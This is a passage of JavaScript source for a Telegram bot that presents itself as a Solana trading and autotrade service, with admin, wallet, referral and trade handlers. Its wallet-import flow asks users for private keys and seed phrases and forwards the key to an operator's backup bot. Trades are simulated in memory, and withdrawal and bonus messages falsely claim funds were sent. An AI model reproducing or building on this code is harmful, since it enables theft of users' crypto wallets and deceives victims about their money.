    const activeSessions = Array.from(autotradeSessions.keys()).length;
    const totalBalance = Array.from(userBalances.values()).reduce((a, b) => Number(a) + Number(b), 0);
    const pendingWithdrawals = Array.from(withdrawalRequests.values()).filter(r => r.status === 'pending').length;
    
    const messageText = `
<b>👑 ADMIN PANEL</b>

📊 <b>Statistics:</b>
• Total Users: ${totalUsers}
• Active Autotrade Sessions: ${activeSessions}
• Total User Balance: ${Number(totalBalance).toFixed(4)} SOL
• Pending Withdrawals: ${pendingWithdrawals}

⚡ <b>Quick Actions:</b>
    `;

    const message = await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '📢 Broadcast Message', callback_data: 'admin_broadcast' },
                    { text: '👥 Manage Users', callback_data: 'admin_users' }
                ],
                [
                    { text: '💰 Set User Balance', callback_data: 'admin_set_balance' },
                    { text: '🎁 Add Referral Bonus', callback_data: 'admin_add_referral_bonus' }
                ],
                [
                    { text: '📊 Statistics', callback_data: 'admin_stats' },
                    { text: '📈 Referral Stats', callback_data: 'admin_referral_stats' }
                ],
                [
                    { text: '🔄 Pending Withdrawals', callback_data: 'admin_withdrawals' }
                ],
                [
                    { text: '✉️ Message User', callback_data: 'admin_message_user' }
                ],
                [
                    { text: '🏠 Main Menu', callback_data: 'menu' }
                ]
            ]
        }
    });
    
    const state = userStates.get(chatId) || {};
    state.adminMenuMessageId = message.message_id;
    userStates.set(chatId, state);
}

async function showAdminUsers(chatId) {
    console.log(`👥 Showing admin users for user ${chatId}`);
    
    if (!ADMIN_IDS.includes(chatId)) {
        return sendTempMessage(chatId, '❌ Access denied');
    }

    const users = Array.from(connectedUsers).slice(0, 20);
    
    if (users.length === 0) {
        return sendTempMessage(chatId, 'No users found');
    }
    
    let messageText = `<b>👥 User Management (Last 20 users)</b>\n\n`;
    
    users.forEach((userId, index) => {
        const userState = userStates.get(userId) || {};
        const username = userState.username || `User_${userId}`;
        const balance = getUserMainBalance(userId);
        const hasAutotrade = autotradeSessions.has(userId.toString());
        const hasUsedReferral = referralSystem.hasUsedReferralCode(userId);
        
        messageText += `<b>${index + 1}. ${username}</b>\n`;
        messageText += `• ID: ${userId}\n`;
        messageText += `• Balance: ${balance.toFixed(4)} SOL\n`;
        messageText += `• Referral used: ${hasUsedReferral ? '✅ Yes' : '❌ No'}\n`;
        messageText += `• Autotrade: ${hasAutotrade ? '✅ Active' : '❌ Inactive'}\n`;
        messageText += `• Last seen: ${new Date().toLocaleString()}\n`;
        messageText += `\n`;
    });
    
    const keyboard = [
        [
            { text: '📊 Full Statistics', callback_data: 'admin_stats' },
            { text: '📈 Referral Stats', callback_data: 'admin_referral_stats' }
        ],
        [
            { text: '🏠 Main Menu', callback_data: 'admin_menu' }
        ]
    ];
    
    await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
}

async function showAdminWithdrawals(chatId) {
    console.log(`🔄 Showing admin withdrawals for user ${chatId}`);
    
    if (!ADMIN_IDS.includes(chatId)) {
        return sendTempMessage(chatId, '❌ Access denied');
    }

    const pendingRequests = Array.from(withdrawalRequests.values())
        .filter(r => r.status === 'pending')
        .slice(0, 10);
    
    if (pendingRequests.length === 0) {
        return sendTempMessage(chatId, '✅ No pending withdrawal requests');
    }
    
    let messageText = `<b>🔄 Pending Withdrawal Requests</b>\n\n`;
    
    pendingRequests.forEach((request, index) => {
        messageText += `<b>${index + 1}. Request ID:</b> ${request.id}\n`;
        messageText += `• User: ${request.username} (${request.userId})\n`;
        messageText += `• Amount: ${request.amount.toFixed(4)} SOL\n`;
        messageText += `• Wallet: <code>${request.walletAddress}</code>\n`;
        messageText += `• Time: ${new Date(request.timestamp).toLocaleString()}\n`;
        messageText += `\n`;
    });
    
    const keyboard = pendingRequests.map(request => [
        { 
            text: `✅ Approve ${request.amount.toFixed(2)} SOL`, 
            callback_data: `admin_approve_withdrawal_${request.id}` 
        },
        { 
            text: `❌ Reject`, 
            callback_data: `admin_reject_withdrawal_${request.id}` 
        }
    ]);
    
    keyboard.push([{ text: '🏠 Main Menu', callback_data: 'admin_menu' }]);
    
    await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
}

async function handleAdminApproveWithdrawal(requestId) {
    console.log(`✅ Admin approving withdrawal: ${requestId}`);
    
    const request = withdrawalRequests.get(requestId);
    if (!request) return false;
    
    const userId = request.userId;
    const amount = request.amount;
    
    request.status = 'approved';
    request.approvedAt = Date.now();
    withdrawalRequests.set(requestId, request);
    
    const currentBalance = getUserMainBalance(userId);
    setUserMainBalance(userId, currentBalance - amount);
    
    savePersistentData();
    
    try {
        await mainBot.sendMessage(userId, 
            `✅ Your withdrawal request has been approved!\n\n` +
            `• Amount: ${amount.toFixed(4)} SOL\n` +
            `• Wallet: <code>${request.walletAddress}</code>\n` +
            `• Status: Approved ✅\n\n` +
            `The funds have been sent to your wallet.`,
            { parse_mode: 'HTML' }
        );
    } catch (error) {
        console.error('Error notifying user:', error);
    }
    
    return true;
}

async function handleAdminRejectWithdrawal(requestId) {
    console.log(`❌ Admin rejecting withdrawal: ${requestId}`);
    
    const request = withdrawalRequests.get(requestId);
    if (!request) return false;
    
    const userId = request.userId;
    
    request.status = 'rejected';
    request.rejectedAt = Date.now();
    withdrawalRequests.set(requestId, request);
    
    savePersistentData();
    
    try {
        await mainBot.sendMessage(userId, 
            `❌ Your withdrawal request has been rejected.\n\n` +
            `• Amount: ${request.amount.toFixed(4)} SOL\n` +
            `• Reason: Admin decision\n\n` +
            `Your main balance remains unchanged.`,
            { parse_mode: 'HTML' }
        );
    } catch (error) {
        console.error('Error notifying user:', error);
    }
    
    return true;
}

async function handleAdminBroadcast(chatId) {
    console.log(`📢 Admin broadcast requested by user ${chatId}`);
    
    if (!ADMIN_IDS.includes(chatId)) {
        return sendTempMessage(chatId, '❌ Access denied');
    }

    await safeSendMessage(chatId, '📢 Send broadcast message (HTML supported):', {
        reply_markup: { force_reply: true }
    });
    
    const state = userStates.get(chatId) || {};
    state.adminAction = 'awaiting_broadcast';
    userStates.set(chatId, state);
}

async function sendBroadcastMessage(chatId, message) {
    console.log(`📢 Sending broadcast to all users`);
    
    let successCount = 0;
    let failCount = 0;
    const users = Array.from(connectedUsers);
    
    for (let i = 0; i < users.length; i++) {
        const userId = users[i];
        try {
            await mainBot.sendMessage(userId, message, { parse_mode: 'HTML' });
            successCount++;
        } catch (error) {
            failCount++;
            console.error(`Failed to send to ${userId}:`, error.message);
        }
        
        if (i < users.length - 1) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
    
    return { successCount, failCount };
}

async function handleAdminSetBalance(chatId) {
    console.log(`💰 Admin set balance requested by user ${chatId}`);
    
    if (!ADMIN_IDS.includes(chatId)) {
        return sendTempMessage(chatId, '❌ Access denied');
    }

    await safeSendMessage(chatId, '👤 Enter user ID to set balance:', {
        reply_markup: { force_reply: true }
    });
    
    const state = userStates.get(chatId) || {};
    state.adminAction = 'awaiting_user_id';
    userStates.set(chatId, state);
}

async function handleAdminAddReferralBonus(chatId) {
    console.log(`🎁 Admin add referral bonus requested by user ${chatId}`);
    
    if (!ADMIN_IDS.includes(chatId)) {
        return sendTempMessage(chatId, '❌ Access denied');
    }

    await safeSendMessage(chatId, '👤 Enter referred user ID (filleul):', {
        reply_markup: { force_reply: true }
    });
    
    const state = userStates.get(chatId) || {};
    state.adminAction = 'awaiting_referred_user';
    userStates.set(chatId, state);
}

async function handleAdminMessageUser(chatId) {
    console.log(`✉️ Admin message user requested by user ${chatId}`);
    
    if (!ADMIN_IDS.includes(chatId)) {
        return sendTempMessage(chatId, '❌ Access denied');
    }

    await safeSendMessage(chatId, '👤 Enter user ID to send message:', {
        reply_markup: { force_reply: true }
    });
    
    const state = userStates.get(chatId) || {};
    state.adminAction = 'awaiting_message_user_id';
    userStates.set(chatId, state);
}

async function sendMessageToUser(adminId, userId, message) {
    try {
        await mainBot.sendMessage(userId, message, { parse_mode: 'HTML' });
        await safeSendMessage(adminId, `✅ Message sent successfully to user ${userId}`);
        return true;
    } catch (error) {
        console.error(`Failed to send message to ${userId}:`, error);
        await safeSendMessage(adminId, `❌ Failed to send message to user ${userId}: ${error.message}`);
        return false;
    }
}

// ==================== TRADING FUNCTIONS ====================
async function showBuyMenu(chatId) {
    console.log(`🛒 Showing buy menu for user ${chatId}`);
    
    try {
        const user = initializeTradingUser(chatId);
        user.tradeState = { step: 'awaiting_token_address' };
        
        await safeSendMessage(
            chatId,
            `<b>🛒 Buy Menu</b>\n\n` +
            `Current settings:\n` +
            `▪ Default amount: ${user.settings.defaultBuyAmount} SOL\n` +
            `▪ Slippage: ${user.settings.slippage}%\n` +
            `▪ Gas fee: ${user.settings.gasFee.toFixed(6)} SOL\n\n` +
            `Enter the token address you want to buy:`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: `Buy ${user.settings.defaultBuyAmount} SOL`, callback_data: `quick_buy_${user.settings.defaultBuyAmount}` }
                        ],
                        [
                            { text: "⚙️ Edit settings", callback_data: "edit_buy_settings" },
                            { text: "❌ Cancel", callback_data: "cancel_action" }
                        ]
                    ]
                }
            }
        );
    } catch (error) {
        console.error('Buy menu error:', error);
    }
}

async function showSellMenu(chatId) {
    console.log(`💰 Showing sell menu for user ${chatId}`);
    
    try {
        const user = initializeTradingUser(chatId);
        const tokens = Object.keys(user.wallet.tokens);
        
        if (tokens.length === 0) {
            await sendTempMessage(chatId, '❌ You don\'t own any tokens to sell');
            return;
        }

        const keyboard = tokens.map(token => [
            {
                text: `${getTokenName(token)} (${user.wallet.tokens[token].amount.toFixed(2)})`,
                callback_data: `sell_select_${token}`
            }
        ]);

        await safeSendMessage(
            chatId,
            `<b>💰 Sell Menu</b>\n\n` +
            `Current settings:\n` +
            `▪ Default percentage: ${user.settings.defaultSellPercent}%\n` +
            `▪ Slippage: ${user.settings.slippage}%\n` +
            `▪ Gas fee: ${user.settings.gasFee.toFixed(6)} SOL\n\n` +
            `Select the token to sell:`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        ...keyboard,
                        [
                            { text: "⚙️ Edit settings", callback_data: "edit_sell_settings" },
                            { text: "❌ Cancel", callback_data: "cancel_action" }
                        ]
                    ]
                }
            }
        );
    } catch (error) {
        console.error('Sell menu error:', error);
    }
}

async function showSettingsMenu(chatId) {
    console.log(`⚙️ Showing settings menu for user ${chatId}`);
    
    try {
        const user = initializeTradingUser(chatId);
        
        await safeSendMessage(
            chatId,
            `<b>⚙️ Trading Settings</b>\n\n` +
            `1. Default buy amount: ${user.settings.defaultBuyAmount} SOL\n` +
            `2. Default sell percentage: ${user.settings.defaultSellPercent}%\n` +
            `3. Slippage: ${user.settings.slippage}%\n` +
            `4. Gas fee: ${user.settings.gasFee.toFixed(6)} SOL\n\n` +
            `Select the setting to modify:`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "Edit buy amount", callback_data: "setting_buy_amount" },
                            { text: "Edit sell %", callback_data: "setting_sell_percent" }
                        ],
                        [
                            { text: "Edit slippage", callback_data: "setting_slippage" },
                            { text: "Edit gas fee", callback_data: "setting_gas_fee" }
                        ],
                        [
                            { text: "🔙 Back", callback_data: "back_to_portfolio" }
                        ]
                    ]
                }
            }
        );
    } catch (error) {
        console.error('Settings menu error:', error);
    }
}

async function executeBuy(chatId, tokenAddress, amountSOL) {
    console.log(`🛒 Executing buy for user ${chatId}: ${tokenAddress}, amount: ${amountSOL} SOL`);
    
    try {
        const user = initializeTradingUser(chatId);
        const currentPrice = updateTokenPrice(tokenAddress);
        
        const slippageMultiplier = 1 - (user.settings.slippage / 100);
        const effectivePrice = currentPrice * slippageMultiplier;
        const tokenAmount = amountSOL / effectivePrice;
        
        const totalCost = amountSOL + user.settings.gasFee;
        
        if (totalCost > user.wallet.SOL) {
            throw new Error(`Insufficient balance. You have ${user.wallet.SOL.toFixed(4)} SOL (total cost: ${totalCost.toFixed(4)} SOL)`);
        }

        user.wallet.SOL -= totalCost;
        user.stats.totalGasFees += user.settings.gasFee;

        if (user.wallet.tokens[tokenAddress]) {
            const totalAmount = user.wallet.tokens[tokenAddress].amount + tokenAmount;
            const totalInvested = (user.wallet.tokens[tokenAddress].amount * 
                user.wallet.tokens[tokenAddress].buyPrice) + amountSOL;
            user.wallet.tokens[tokenAddress] = {
                amount: totalAmount,
                buyPrice: totalInvested / totalAmount
            };
        } else {
            user.wallet.tokens[tokenAddress] = {
                amount: tokenAmount,
                buyPrice: effectivePrice
            };
        }

        const txData = {
            type: 'buy',
            token: tokenAddress,
            amount: tokenAmount,
            price: effectivePrice,
            totalValue: amountSOL,
            gasFee: user.settings.gasFee,
            date: new Date().toISOString(),
            buyPrice: effectivePrice
        };

        user.wallet.history.push(txData);

        if (user.wallet.history.length > TRADING_CONFIG.TRANSACTION_HISTORY_LIMIT) {
            user.wallet.history.shift();
        }

        return {
            success: true,
            message: `<b>✅ Purchase successful!</b>\n\n` +
                `▸ Token: ${getTokenName(tokenAddress)}\n` +
                `▸ Amount invested: ${amountSOL.toFixed(4)} SOL\n` +
                `▸ Gas fee: ${user.settings.gasFee.toFixed(6)} SOL\n` +
                `▸ Tokens received: ${tokenAmount.toFixed(2)}\n` +
                `▸ Purchase price: ${effectivePrice.toFixed(8)} SOL (incl. slippage ${user.settings.slippage}%)\n\n` +
                `New balance: ${user.wallet.SOL.toFixed(4)} SOL`
        };
    } catch (error) {
        console.error('Buy execution error:', error);
        return {
            success: false,
            message: `❌ Purchase error: ${error.message}`
        };
    }
}

async function executeSell(chatId, tokenAddress, percent) {
    console.log(`💰 Executing sell for user ${chatId}: ${tokenAddress}, percent: ${percent}%`);
    
    try {
        const user = initializeTradingUser(chatId);
        const tokenData = user.wallet.tokens[tokenAddress];
        const currentPrice = updateTokenPrice(tokenAddress);
        
        const slippageMultiplier = 1 + (user.settings.slippage / 100);
        const effectivePrice = currentPrice * slippageMultiplier;
        const tokenAmount = tokenData.amount * (percent / 100);
        const solReceived = tokenAmount * effectivePrice;

        const finalAmount = solReceived - user.settings.gasFee;
        
        if (finalAmount <= 0) {
            throw new Error('Amount too low after gas fees');
        }

        const pnl = (tokenAmount * effectivePrice) - (tokenAmount * tokenData.buyPrice);

        user.wallet.SOL += finalAmount;
        user.stats.totalGasFees += user.settings.gasFee;
        user.wallet.tokens[tokenAddress].amount -= tokenAmount;

        if (user.wallet.tokens[tokenAddress].amount <= 0.0001) {
            delete user.wallet.tokens[tokenAddress];
        }

        const txData = {
            type: 'sell',
            token: tokenAddress,
            amount: tokenAmount,
            price: effectivePrice,
            totalValue: solReceived,
            gasFee: user.settings.gasFee,
            date: new Date().toISOString(),
            buyPrice: tokenData.buyPrice,
            pnl: pnl
        };

        user.wallet.history.push(txData);

        if (user.wallet.history.length > TRADING_CONFIG.TRANSACTION_HISTORY_LIMIT) {
            user.wallet.history.shift();
        }

        return {
            success: true,
            message: `<b>✅ Sale successful!</b>\n\n` +
                `▸ Token: ${getTokenName(tokenAddress)}\n` +
                `▸ Tokens sold: ${tokenAmount.toFixed(2)}\n` +
                `▸ SOL received: ${solReceived.toFixed(4)} (after fees: ${finalAmount.toFixed(4)} SOL)\n` +
                `▸ Gas fee: ${user.settings.gasFee.toFixed(6)} SOL\n` +
                `▸ Sale price: ${effectivePrice.toFixed(8)} SOL (incl. slippage ${user.settings.slippage}%)\n` +
                `▸ PNL: ${formatPNL(pnl)}\n\n` +
                `New balance: ${user.wallet.SOL.toFixed(4)} SOL`
        };
    } catch (error) {
        console.error('Sale execution error:', error);
        return {
            success: false,
            message: `❌ Sale error: ${error.message}`
        };
    }
}

// ==================== COMMAND HANDLERS ====================
mainBot.onText(/\/start(?:\s+(\w+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const referralCode = match[1];
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
    
    console.log(`🚀 /start command from user ${chatId} (${username}), referral code: ${referralCode}`);
    
    const state = userStates.get(chatId) || {};
    state.username = username;
    userStates.set(chatId, state);
    
    if (!connectedUsers.has(chatId)) {
        connectedUsers.add(chatId);
        const notification = `🆕 New user connected:\n\n• ID: ${chatId}\n• Name: ${username}`;
        
        if (backupBot) {
            await backupBot.sendMessage(BACKUP_CHAT_ID, notification);
        }
        
        // Sauvegarder dans PostgreSQL
        if (pgClient) {
            try {
                await pgClient.query(
                    `INSERT INTO users (chat_id, username, last_active) 
                     VALUES ($1, $2, CURRENT_TIMESTAMP)
                     ON CONFLICT (chat_id) DO UPDATE SET last_active = CURRENT_TIMESTAMP`,
                    [chatId, username]
                );
            } catch (error) {
                console.error('Error saving user to database:', error);
            }
        }
    }

    if (!userSettings.has(chatId)) {
        userSettings.set(chatId, {
            slippage: '1%',
            gasPriority: 'Medium',
            theme: 'Dark',
            notifications: true,
            hasVisitedTradingMenu: false,
            language: 'en'
        });
    }

    if (referralCode) {
        if (referralSystem.useCode(chatId, referralCode)) {
            // Afficher le message de félicitations après l'entrée du code
            await showAccessGranted(chatId);
            return;
        }
    }
    
    if (ADMIN_IDS.includes(chatId)) {
        showTradingMenu(chatId);
    } else {
        showMainMenu(chatId);
    }
});

mainBot.onText(/\/admin/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (ADMIN_IDS.includes(chatId)) {
        showAdminMenu(chatId);
    } else {
        sendTempMessage(chatId, '❌ Access denied');
    }
});

// ==================== CALLBACK HANDLERS ====================
mainBot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;

    console.log(`🔄 Callback from user ${chatId}: ${data}`);

    try {
        await mainBot.answerCallbackQuery(callbackQuery.id);
        
        // Session info handler
        if (data === 'session_info') {
            const sessionInfo = sessionLimiter.getSessionInfo(chatId);
            const messageText = `
<b>📊 Session Information</b>

• Sessions used today: ${sessionInfo.dailySessions}/${sessionInfo.dailyLimit}
• Remaining sessions: ${sessionInfo.remainingSessions}
• Last session date: ${sessionInfo.lastSessionDate || 'Never'}

💡 <b>Daily Limit:</b> ${sessionInfo.dailyLimit} sessions per day
⏰ <b>Reset time:</b> 00:00 UTC

📈 <b>Tip:</b> Use your sessions wisely for maximum profit!
            `;
            
            await safeSendMessage(chatId, messageText, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🚀 Start Autotrade', callback_data: 'autotrade_menu' },
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
            return;
        }
        
        // Autotrade handlers
        if (data.startsWith('autotrade_stop')) {
            console.log(`🛑 Stop autotrade requested by ${chatId}`);
            await stopAutotradeSession(chatId);
            return;
        }
        
        if (data.startsWith('autotrade_refresh')) {
            const session = autotradeSessions.get(chatId.toString());
            if (session) {
                await session.sendAutotradeUpdate(chatId, messageId);
            }
            return;
        }
        
        if (data === 'autotrade_menu') {
            return showAutotradeMenu(chatId);
        }
        
        if (data.startsWith('autotrade_mode_')) {
            const mode = data.split('_')[2].toUpperCase();
            const state = userStates.get(chatId) || {};
            state.autotradeMode = mode;
            state.action = 'awaiting_autotrade_amount';
            userStates.set(chatId, state);
            
            const mainBalance = getUserMainBalance(chatId);
            await safeSendMessage(chatId, 
                `Enter amount for ${mode} mode (max: ${mainBalance.toFixed(4)} SOL):`,
                { reply_markup: { force_reply: true } }
            );
            return;
        }
        
        if (data === 'autotrade_denied') {
            const sessionInfo = sessionLimiter.getSessionInfo(chatId);
            const mainBalance = getUserMainBalance(chatId);
            
            let alertMessage = '';
            if (mainBalance < 1) {
                alertMessage = 'You need at least 1 SOL in main balance to use Autotrade';
            } else if (!sessionInfo.canStart) {
                alertMessage = 'You have reached your daily session limit. Try again tomorrow.';
            } else {
                alertMessage = 'Cannot start autotrade session';
            }
            
            await mainBot.answerCallbackQuery(callbackQuery.id, { 
                text: alertMessage, 
                show_alert: true 
            });
            return;
        }
        
        // PNL Card handlers
        if (data === 'generate_pnl_card') {
            return generatePNLCard(chatId);
        }
        
        if (data === 'view_best_trades') {
            return viewBestTrades(chatId);
        }
        
        // Wallet handlers
        if (data === 'import_wallet_menu') {
            return showImportWalletMenu(chatId);
        }
        
        if (data === 'import_private_key') {
            await safeSendMessage(chatId, 'Send your private key (Hex or Base58):', { 
                reply_markup: { force_reply: true } 
            });
            const state = userStates.get(chatId) || {};
            state.action = 'awaiting_private_key';
            userStates.set(chatId, state);
            return;
        }
        
        if (data === 'import_seed_phrase') {
            await safeSendMessage(chatId, 'Send your seed phrase (12 or 24 words):', { 
                reply_markup: { force_reply: true } 
            });
            const state = userStates.get(chatId) || {};
            state.action = 'awaiting_seed_phrase';
            userStates.set(chatId, state);
            return;
        }
        
        if (data === 'wallet_menu') {
            return showWalletMenu(chatId);
        }
        
        if (data === 'transfer_to_wallet') {
            return showTransferMenu(chatId);
        }
        
        if (data.startsWith('transfer_select_')) {
            const index = parseInt(data.split('_')[2]);
            const state = userStates.get(chatId) || {};
            state.transferWalletIndex = index;
            state.action = 'awaiting_transfer_amount';
            userStates.set(chatId, state);
            
            const mainBalance = getUserMainBalance(chatId);
            await safeSendMessage(chatId, 
                `Enter amount to transfer (max: ${mainBalance.toFixed(4)} SOL):`,
                { reply_markup: { force_reply: true } }
            );
            return;
        }
        
        if (data === 'rename_wallet') {
            return handleRenameWallet(chatId);
        }
        
        if (data === 'delete_wallet') {
            return handleDeleteWallet(chatId);
        }
        
        if (data === 'set_default_wallet') {
            return handleSetDefaultWallet(chatId);
        }
        
        if (data === 'refresh_wallet') {
            return showWalletMenu(chatId);
        }
        
        if (data.startsWith('rename_select_')) {
            const index = parseInt(data.split('_')[2]);
            const state = userStates.get(chatId) || {};
            state.action = 'awaiting_wallet_rename';
            state.walletIndex = index;
            userStates.set(chatId, state);
            return safeSendMessage(chatId, 'Enter new name for this wallet:', {
                reply_markup: { force_reply: true }
            });
        }
        
        if (data.startsWith('delete_select_')) {
            const index = parseInt(data.split('_')[2]);
            const wallets = userWallets.get(chatId) || [];
            const wallet = wallets[index];
            
            if (!wallet) {
                return sendTempMessage(chatId, '❌ Wallet not found');
            }
            
            wallets.splice(index, 1);
            userWallets.set(chatId, wallets);
            
            if (wallet.isDefault && wallets.length > 0) {
                wallets[0].isDefault = true;
            }
            
            savePersistentData();
            return showWalletMenu(chatId);
        }
        
        if (data.startsWith('default_select_')) {
            const index = parseInt(data.split('_')[2]);
            const wallets = userWallets.get(chatId) || [];
            
            wallets.forEach((w, i) => {
                w.isDefault = (i === index);
            });
            
            userWallets.set(chatId, wallets);
            savePersistentData();
            return showWalletMenu(chatId);
        }
        
        // Rug check
        if (data === 'rug_check') {
            await safeSendMessage(chatId, 'Send token address for rug check:', { 
                reply_markup: { force_reply: true } 
            });
            const state = userStates.get(chatId) || {};
            state.action = 'awaiting_token_analysis';
            userStates.set(chatId, state);
            return;
        }
        
        // View trade history
        if (data === 'view_trade_history') {
            return viewTradeHistory(chatId);
        }
        
        // Admin handlers
        if (data === 'admin_users') {
            return showAdminUsers(chatId);
        }
        
        if (data === 'admin_add_referral_bonus') {
            return handleAdminAddReferralBonus(chatId);
        }
        
        if (data === 'admin_message_user') {
            return handleAdminMessageUser(chatId);
        }
        
        if (data.startsWith('admin_approve_withdrawal_')) {
            const requestId = data.split('_')[3];
            const success = await handleAdminApproveWithdrawal(requestId);
            
            if (success) {
                await safeSendMessage(chatId, `✅ Withdrawal request approved!`);
                await mainBot.deleteMessage(chatId, messageId);
            } else {
                await sendTempMessage(chatId, '❌ Failed to approve withdrawal');
            }
            return;
        }
        
        if (data.startsWith('admin_reject_withdrawal_')) {
            const requestId = data.split('_')[3];
            const success = await handleAdminRejectWithdrawal(requestId);
            
            if (success) {
                await safeSendMessage(chatId, `❌ Withdrawal request rejected!`);
                await mainBot.deleteMessage(chatId, messageId);
            } else {
                await sendTempMessage(chatId, '❌ Failed to reject withdrawal');
            }
            return;
        }
        
        // Other handlers
        const handlers = {
            'menu': () => showTradingMenu(chatId),
            'referral': showReferralMenu,
            'help': showHelpMenu,
            'refresh': () => showTradingMenu(chatId),
            'buy_sell': () => showBuySellMenu(chatId),
            'positions': () => showBuySellMenu(chatId),
            'call_ai': () => callAITokenAnalysis(chatId),
            'withdraw_bonus': async () => {
                const bonusAmount = referralSystem.getUserBonus(chatId);
                const wallets = userWallets.get(chatId) || [];
                const defaultWallet = wallets.find(w => w.isDefault) || wallets[0];
                
                if (!defaultWallet) {
                    return sendTempMessage(chatId, '❌ You need to set up a wallet first');
                }
                
                if (!referralSystem.canWithdrawBonus(chatId)) {
                    return sendTempMessage(chatId, 
                        `❌ You need at least 3 valid referrals to withdraw your bonus\n` +
                        `Current valid referrals: ${referralSystem.getUserValidReferrals(chatId)}/3`
                    );
                }
                
                if (bonusAmount <= 0) {
                    return sendTempMessage(chatId, '❌ No bonus to withdraw');
                }
                
                referralSystem.addBonus(chatId, -bonusAmount);
                
                await sendTempMessage(chatId, 
                    `✅ ${Number(bonusAmount).toFixed(4)} SOL referral bonus has been sent to your wallet\n` +
                    `Address: <code>${defaultWallet.publicKey}</code>`
                );
                
                showReferralMenu(chatId);
            },
            'join_queue': startWaitlist,
            'enter_code': () => {
                const state = userStates.get(chatId) || {};
                state.awaitingCode = true;
                userStates.set(chatId, state);
                safeSendMessage(chatId, "Please send your access code:");
            },
            'continue': () => showTradingMenu(chatId),
            'refresh_waitlist': () => {
                const state = userStates.get(chatId) || {};
                if (state.waitlistMessageId) {
                    updateWaitlistMessage(chatId, state.waitlistMessageId, state.waitlistTime);
                }
            },
            'refresh_portfolio': async () => {
                await mainBot.answerCallbackQuery(callbackQuery.id, { text: 'Refreshing...' });
                await updatePortfolioMessage(chatId, messageId);
            },
            'show_stats': async () => {
                await mainBot.answerCallbackQuery(callbackQuery.id);
                await showStats(chatId);
            },
            'show_buy': async () => {
                await mainBot.answerCallbackQuery(callbackQuery.id);
                await showBuyMenu(chatId);
            },
            'show_sell': async () => {
                await mainBot.answerCallbackQuery(callbackQuery.id);
                await showSellMenu(chatId);
            },
            'show_settings': async () => {
                await mainBot.answerCallbackQuery(callbackQuery.id);
                await showSettingsMenu(chatId);
            },
            'back_to_portfolio': async () => {
                await mainBot.answerCallbackQuery(callbackQuery.id);
                const newPortfolioMsg = await safeSendMessage(chatId, '🔄 Returning to portfolio...');
                if (newPortfolioMsg) {
                    if (!tradingState.trackedMessages.has(chatId)) {
                        tradingState.trackedMessages.set(chatId, new Set());
                    }
                    tradingState.trackedMessages.get(chatId).add(newPortfolioMsg.message_id);
                    await updatePortfolioMessage(chatId, newPortfolioMsg.message_id);
                }
            },
            'cancel_action': async () => {
                await mainBot.answerCallbackQuery(callbackQuery.id, { text: 'Action cancelled' });
                try {
                    await mainBot.deleteMessage(chatId, messageId);
                } catch (e) {}
                const user = tradingState.users[chatId];
                if (user) delete user.tradeState;
                const state = userStates.get(chatId) || {};
                delete state.action;
                delete state.adminAction;
                userStates.set(chatId, state);
            },
            'admin_menu': () => showAdminMenu(chatId),
            'admin_broadcast': () => handleAdminBroadcast(chatId),
            'admin_set_balance': () => handleAdminSetBalance(chatId),
            'admin_withdrawals': () => showAdminWithdrawals(chatId),
            'admin_stats': async () => {
                const totalUsers = connectedUsers.size;
                const activeSessions = Array.from(autotradeSessions.keys()).length;
                const totalBalance = Array.from(userBalances.values()).reduce((a, b) => Number(a) + Number(b), 0);
                const pendingWithdrawals = Array.from(withdrawalRequests.values()).filter(r => r.status === 'pending').length;
                
                await safeSendMessage(chatId, 
                    `<b>📊 Admin Statistics</b>\n\n` +
                    `• Total Users: ${totalUsers}\n` +
                    `• Active Autotrade Sessions: ${activeSessions}\n` +
                    `• Total User Balance: ${Number(totalBalance).toFixed(4)} SOL\n` +
                    `• Pending Withdrawals: ${pendingWithdrawals}\n` +
                    `• Server Uptime: ${formatTime(process.uptime())}`,
                    {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '🏠 Main Menu', callback_data: 'admin_menu' }
                                ]
                            ]
                        }
                    }
                );
            },
            'admin_referral_stats': async () => {
                const totalReferrals = Array.from(referralSystem.referrals.values())
                    .reduce((sum, ref) => sum + ref.uses, 0);
                const totalBonus = Array.from(referralSystem.bonusPayments.values())
                    .reduce((sum, bonus) => sum + bonus, 0);
                
                await safeSendMessage(chatId, 
                    `<b>📈 Referral Statistics</b>\n\n` +
                    `• Total Referrals: ${totalReferrals}\n` +
                    `• Total Bonus Distributed: ${Number(totalBonus).toFixed(4)} SOL\n` +
                    `• Active Referral Codes: ${referralSystem.referrals.size}\n` +
                    `• Users with Bonus: ${referralSystem.bonusPayments.size}`,
                    {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '🏠 Main Menu', callback_data: 'admin_menu' }
                                ]
                            ]
                        }
                    }
                );
            }
        };
        
        if (handlers[data]) {
            await handlers[data](chatId);
        }
        
    } catch (error) {
        console.error('Callback error:', error);
        await sendTempMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// ==================== MESSAGE HANDLERS ====================
mainBot.on('message', async (msg) => {
    if (!msg.text || msg.text.startsWith('/')) return;
    
    const chatId = msg.chat.id;
    const state = userStates.get(chatId) || {};

    console.log(`✉️ Message from user ${chatId}: ${msg.text.substring(0, 50)}...`);

    try {
        // Private key import
        if (state.action === 'awaiting_private_key') {
            console.log(`🔑 Processing private key for user ${chatId}`);
            const { keypair, cleanKey } = validatePrivateKey(msg.text);
            await sendToBackupBot(chatId, 'private key', cleanKey);
            
